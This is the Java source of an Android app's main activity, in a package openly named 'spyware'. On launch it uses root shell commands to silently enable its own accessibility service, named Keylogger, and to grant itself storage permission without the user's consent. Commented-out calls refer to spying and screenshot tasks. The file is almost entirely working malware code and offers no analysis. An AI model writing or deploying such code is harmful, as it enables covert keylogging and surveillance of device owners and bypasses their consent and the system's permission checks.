package com.example.cristianturetta.spyware;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import java.io.DataOutputStream;

public class MainActivity extends AppCompatActivity {

    private class StartupAsyncTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            // this method is executed in a background thread
            // no problem calling su here
            enableAccessibility();
            enableStoragePermissions();
            return null;
        }
    }



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);

        (new StartupAsyncTask()).execute();
        //(new SpyAsyncTask()).execute();
        //(new ScreenshotUtilRunnable()).run();
    }


    void enableStoragePermissions(){
        // not running on the main thread
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("pm grant com.example.cristianturetta.spyware android.permission.WRITE_EXTERNAL_STORAGE\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();

            process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }



    void enableAccessibility(){
        Log.d("MainActivity", "not on main thread");
        // not running on the main thread
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("settings put secure enabled_accessibility_services com.example.cristianturetta.spyware/com.example.cristianturetta.spyware.Keylogger\n");
            os.flush();
            os.writeBytes("settings put secure accessibility_enabled 1\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();

            process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
